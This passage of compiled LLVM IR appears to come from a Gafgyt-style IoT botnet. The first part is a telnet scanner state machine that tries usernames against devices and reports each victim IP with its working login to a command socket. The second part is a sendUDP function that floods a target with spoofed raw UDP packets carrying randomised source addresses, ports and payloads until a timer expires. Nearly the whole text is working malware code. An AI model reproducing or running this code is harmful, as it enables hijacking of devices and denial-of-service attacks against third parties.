  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1038
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1039, i32 0, i32 2
  store i8 0, i8* %1040, align 8
  br label %1278

; <label>:1041:                                   ; preds = %959
  %1042 = load i32, i32* %2, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 8
  %1046 = load i8*, i8** %1045, align 8
  %1047 = call i64 @strlen(i8* %1046) #10
  %1048 = trunc i64 %1047 to i16
  %1049 = load i32, i32* %2, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 7
  store i16 %1048, i16* %1052, align 16
  br label %1053

; <label>:1053:                                   ; preds = %1041
  %1054 = load i32, i32* %2, align 4
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1055
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1056, i32 0, i32 6
  %1058 = load i32, i32* %1057, align 4
  %1059 = add i32 %1058, 30
  %1060 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1061 = icmp ult i32 %1059, %1060
  br i1 %1061, label %1062, label %1077

; <label>:1062:                                   ; preds = %1053
  %1063 = load i32, i32* %2, align 4
  %1064 = sext i32 %1063 to i64
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1064
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1065, i32 0, i32 0
  %1067 = load i32, i32* %1066, align 16
  %1068 = call i32 @sclose(i32 %1067)
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 2
  store i8 0, i8* %1072, align 8
  %1073 = load i32, i32* %2, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 3
  store i8 1, i8* %1076, align 1
  br label %1077

; <label>:1077:                                   ; preds = %1062, %1053
  br label %1277

; <label>:1078:                                   ; preds = %65
  %1079 = load i32, i32* %2, align 4
  %1080 = sext i32 %1079 to i64
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1080
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1081, i32 0, i32 0
  %1083 = load i32, i32* %1082, align 16
  %1084 = call i64 @send(i32 %1083, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %1085 = icmp slt i64 %1084, 0
  br i1 %1085, label %1086, label %1101

; <label>:1086:                                   ; preds = %1078
  %1087 = load i32, i32* %2, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 0
  %1091 = load i32, i32* %1090, align 16
  %1092 = call i32 @sclose(i32 %1091)
  %1093 = load i32, i32* %2, align 4
  %1094 = sext i32 %1093 to i64
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1094
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1095, i32 0, i32 2
  store i8 0, i8* %1096, align 8
  %1097 = load i32, i32* %2, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 3
  store i8 1, i8* %1100, align 1
  br label %1278

; <label>:1101:                                   ; preds = %1078
  %1102 = load i32, i32* %2, align 4
  %1103 = sext i32 %1102 to i64
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 2
  store i8 101, i8* %1105, align 8
  br label %1277

; <label>:1106:                                   ; preds = %65
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 0
  %1111 = load i32, i32* %1110, align 16
  %1112 = call i64 @send(i32 %1111, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 282, i32 16384)
  %1113 = icmp slt i64 %1112, 0
  br i1 %1113, label %1114, label %1129

; <label>:1114:                                   ; preds = %1106
  %1115 = load i32, i32* %2, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1116
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1117, i32 0, i32 0
  %1119 = load i32, i32* %1118, align 16
  %1120 = call i32 @sclose(i32 %1119)
  %1121 = load i32, i32* %2, align 4
  %1122 = sext i32 %1121 to i64
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1122
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1123, i32 0, i32 2
  store i8 0, i8* %1124, align 8
  %1125 = load i32, i32* %2, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 3
  store i8 1, i8* %1128, align 1
  br label %1278

; <label>:1129:                                   ; preds = %1106
  %1130 = load i32, i32* %2, align 4
  %1131 = sext i32 %1130 to i64
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1131
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1132, i32 0, i32 2
  store i8 102, i8* %1133, align 8
  br label %1277

; <label>:1134:                                   ; preds = %65
  %1135 = load i32, i32* %2, align 4
  %1136 = sext i32 %1135 to i64
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1136
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1137, i32 0, i32 0
  %1139 = load i32, i32* %1138, align 16
  %1140 = call i64 @send(i32 %1139, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %1141 = icmp slt i64 %1140, 0
  br i1 %1141, label %1142, label %1157

; <label>:1142:                                   ; preds = %1134
  %1143 = load i32, i32* %2, align 4
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1144
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1145, i32 0, i32 0
  %1147 = load i32, i32* %1146, align 16
  %1148 = call i32 @sclose(i32 %1147)
  %1149 = load i32, i32* %2, align 4
  %1150 = sext i32 %1149 to i64
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1150
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1151, i32 0, i32 2
  store i8 0, i8* %1152, align 8
  %1153 = load i32, i32* %2, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 3
  store i8 1, i8* %1156, align 1
  br label %1278

; <label>:1157:                                   ; preds = %1134
  %1158 = load i32, i32* %2, align 4
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 2
  store i8 103, i8* %1161, align 8
  br label %1277

; <label>:1162:                                   ; preds = %65
  %1163 = load i32, i32* %2, align 4
  %1164 = sext i32 %1163 to i64
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1164
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1165, i32 0, i32 6
  %1167 = load i32, i32* %1166, align 4
  %1168 = icmp eq i32 %1167, 0
  br i1 %1168, label %1169, label %1175

; <label>:1169:                                   ; preds = %1162
  %1170 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1171 = load i32, i32* %2, align 4
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 6
  store i32 %1170, i32* %1174, align 4
  br label %1175

; <label>:1175:                                   ; preds = %1169, %1162
  %1176 = load i32, i32* %2, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1177
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1178, i32 0, i32 0
  %1180 = load i32, i32* %1179, align 16
  %1181 = load i32, i32* %2, align 4
  %1182 = sext i32 %1181 to i64
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 8
  %1185 = load i8*, i8** %1184, align 8
  %1186 = load i32, i32* %2, align 4
  %1187 = sext i32 %1186 to i64
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1187
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1188, i32 0, i32 7
  %1190 = load i16, i16* %1189, align 16
  %1191 = zext i16 %1190 to i32
  %1192 = call i32 @readUntil(i32 %1180, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1185, i32 1024, i32 %1191)
  %1193 = icmp ne i32 %1192, 0
  br i1 %1193, label %1194, label %1240

; <label>:1194:                                   ; preds = %1175
  %1195 = load i32, i32* %2, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 6
  store i32 0, i32* %1198, align 4
  %1199 = load i32, i32* %2, align 4
  %1200 = sext i32 %1199 to i64
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1200
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1201, i32 0, i32 7
  store i16 0, i16* %1202, align 16
  %1203 = load i32, i32* @mainCommSock, align 4
  %1204 = load i32, i32* %2, align 4
  %1205 = sext i32 %1204 to i64
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1205
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1206, i32 0, i32 1
  %1208 = bitcast i32* %1207 to %struct.in_addr*
  %1209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1208, i32 0, i32 0
  %1210 = load i32, i32* %1209, align 4
  %1211 = call i8* @inet_ntoa(i32 %1210) #4
  %1212 = load i32, i32* %2, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1213
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1214, i32 0, i32 4
  %1216 = load i8, i8* %1215, align 2
  %1217 = zext i8 %1216 to i64
  %1218 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1217
  %1219 = load i8*, i8** %1218, align 8
  %1220 = call i32 (i32, i8*, ...) @sockprintf(i32 %1203, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* %1211, i8* %1219)
  %1221 = load i32, i32* %2, align 4
  %1222 = sext i32 %1221 to i64
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1222
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1223, i32 0, i32 0
  %1225 = load i32, i32* %1224, align 16
  %1226 = call i32 @sclose(i32 %1225)
  %1227 = load i32, i32* %2, align 4
  %1228 = sext i32 %1227 to i64
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1228
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1229, i32 0, i32 2
  store i8 0, i8* %1230, align 8
  %1231 = load i32, i32* %2, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 8
  %1235 = load i8*, i8** %1234, align 8
  call void @llvm.memset.p0i8.i64(i8* %1235, i8 0, i64 1024, i32 1, i1 false)
  %1236 = load i32, i32* %2, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 3
  store i8 1, i8* %1239, align 1
  br label %1278

; <label>:1240:                                   ; preds = %1175
  %1241 = load i32, i32* %2, align 4
  %1242 = sext i32 %1241 to i64
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 8
  %1245 = load i8*, i8** %1244, align 8
  %1246 = call i64 @strlen(i8* %1245) #10
  %1247 = trunc i64 %1246 to i16
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 7
  store i16 %1247, i16* %1251, align 16
  br label %1252

; <label>:1252:                                   ; preds = %1240
  %1253 = load i32, i32* %2, align 4
  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 6
  %1257 = load i32, i32* %1256, align 4
  %1258 = add i32 %1257, 30
  %1259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1260 = icmp ult i32 %1258, %1259
  br i1 %1260, label %1261, label %1276

; <label>:1261:                                   ; preds = %1252
  %1262 = load i32, i32* %2, align 4
  %1263 = sext i32 %1262 to i64
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1263
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1264, i32 0, i32 0
  %1266 = load i32, i32* %1265, align 16
  %1267 = call i32 @sclose(i32 %1266)
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 2
  store i8 0, i8* %1271, align 8
  %1272 = load i32, i32* %2, align 4
  %1273 = sext i32 %1272 to i64
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1273
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1274, i32 0, i32 3
  store i8 1, i8* %1275, align 1
  br label %1276

; <label>:1276:                                   ; preds = %1261, %1252
  br label %1277

; <label>:1277:                                   ; preds = %1276, %1157, %1129, %1101, %1077, %941, %913, %885, %861, %713, %649, %521, %457, %370, %214, %65
  br label %1278

; <label>:1278:                                   ; preds = %1277, %1194, %1142, %1114, %1086, %1021, %926, %898, %870, %819, %794, %766, %698, %675, %598, %584, %506, %483, %403, %295, %167, %137
  %1279 = load i32, i32* %2, align 4
  %1280 = add nsw i32 %1279, 1
  store i32 %1280, i32* %2, align 4
  br label %61

; <label>:1281:                                   ; preds = %61
  br label %59
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

declare i32 @time(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %269

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %104

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #4
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %269

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = call noalias i8* @malloc(i64 %62) #4
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %59
  br label %269

; <label>:67:                                     ; preds = %59
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %71, i32 1, i1 false)
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %72, i32 %73)
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %74, %75
  store i32 %76, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %100, %99, %67
  %78 = load i32, i32* %15, align 4
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
  %82 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %83 = call i64 @sendto(i32 %78, i8* %79, i64 %81, i32 0, %struct.sockaddr* %82, i32 16)
  %84 = load i32, i32* %18, align 4
  %85 = load i32, i32* %14, align 4
  %86 = icmp eq i32 %84, %85
  br i1 %86, label %87, label %100

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %8, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %87
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %92, i16* %93, align 2
  br label %94

; <label>:94:                                     ; preds = %90, %87
  %95 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %96 = load i32, i32* %17, align 4
  %97 = icmp sgt i32 %95, %96
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %94
  br label %103

; <label>:99:                                     ; preds = %94
  store i32 0, i32* %18, align 4
  br label %77

; <label>:100:                                    ; preds = %77
  %101 = load i32, i32* %18, align 4
  %102 = add i32 %101, 1
  store i32 %102, i32* %18, align 4
  br label %77

; <label>:103:                                    ; preds = %98
  br label %269

; <label>:104:                                    ; preds = %46
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #4
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @mainCommSock, align 4
  %110 = call i32 (i32, i8*, ...) @sockprintf(i32 %109, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %269

; <label>:111:                                    ; preds = %104
  store i32 1, i32* %20, align 4
  %112 = load i32, i32* %19, align 4
  %113 = bitcast i32* %20 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #4
  %115 = icmp slt i32 %114, 0
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  br label %269

; <label>:119:                                    ; preds = %111
  store i32 50, i32* %21, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %119
  %121 = load i32, i32* %21, align 4
  %122 = add nsw i32 %121, -1
  store i32 %122, i32* %21, align 4
  %123 = icmp ne i32 %121, 0
  br i1 %123, label %124, label %129

; <label>:124:                                    ; preds = %120
  %125 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %126 = call i32 @rand_cmwc()
  %127 = xor i32 %125, %126
  call void @srand(i32 %127) #4
  %128 = call i32 @rand() #4
  call void @init_rand(i32 %128)
  br label %120

; <label>:129:                                    ; preds = %120
  %130 = load i32, i32* %10, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  store i32 0, i32* %22, align 4
  br label %139

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %10, align 4
  %135 = sub nsw i32 32, %134
  %136 = shl i32 1, %135
  %137 = sub nsw i32 %136, 1
  %138 = xor i32 %137, -1
  store i32 %138, i32* %22, align 4
  br label %139

; <label>:139:                                    ; preds = %133, %132
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 28, %141
  %143 = call i8* @llvm.stacksave()
  store i8* %143, i8** %23, align 8
  %144 = alloca i8, i64 %142, align 16
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %24, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = getelementptr i8, i8* %147, i64 20
  %149 = bitcast i8* %148 to %struct.udphdr*
  store %struct.udphdr* %149, %struct.udphdr** %25, align 8
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 4
  %154 = load i32, i32* %22, align 4
  %155 = call i32 @getRandomIP(i32 %154)
  %156 = call i32 @htonl(i32 %155) #13
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 8, %158
  %160 = trunc i64 %159 to i32
  call void @makeIPPacket(%struct.iphdr* %150, i32 %153, i32 %156, i8 zeroext 17, i32 %160)
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = add i64 8, %162
  %164 = trunc i64 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #13
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.2* %167 to %struct.anon.3*
  %169 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %168, i32 0, i32 2
  store i16 %165, i16* %169, align 2
  %170 = call i32 @rand_cmwc()
  %171 = trunc i32 %170 to i16
  %172 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.2* %173 to %struct.anon.3*
  %175 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %174, i32 0, i32 0
  store i16 %171, i16* %175, align 2
  %176 = load i32, i32* %8, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %180

; <label>:178:                                    ; preds = %139
  %179 = call i32 @rand_cmwc()
  br label %185

; <label>:180:                                    ; preds = %139
  %181 = load i32, i32* %8, align 4
  %182 = trunc i32 %181 to i16
  %183 = call zeroext i16 @htons(i16 zeroext %182) #13
  %184 = zext i16 %183 to i32
  br label %185

; <label>:185:                                    ; preds = %180, %178
  %186 = phi i32 [ %179, %178 ], [ %184, %180 ]
  %187 = trunc i32 %186 to i16
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.2* %189 to %struct.anon.3*
  %191 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %190, i32 0, i32 1
  store i16 %187, i16* %191, align 2
  %192 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.2* %193 to %struct.anon.3*
  %195 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %194, i32 0, i32 3
  store i16 0, i16* %195, align 2
  %196 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %197 = bitcast %struct.udphdr* %196 to i8*
  %198 = getelementptr inbounds i8, i8* %197, i64 8
  %199 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %198, i32 %199)
  %200 = bitcast i8* %144 to i16*
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  %203 = load i16, i16* %202, align 2
  %204 = zext i16 %203 to i32
  %205 = call zeroext i16 @csum(i16* %200, i32 %204)
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 7
  store i16 %205, i16* %207, align 2
  %208 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %208, %209
  store i32 %210, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %211

; <label>:211:                                    ; preds = %264, %263, %185
  br label %212

; <label>:212:                                    ; preds = %211
  %213 = load i32, i32* %19, align 4
  %214 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %213, i8* %144, i64 %142, i32 0, %struct.sockaddr* %214, i32 16)
  %216 = call i32 @rand_cmwc()
  %217 = trunc i32 %216 to i16
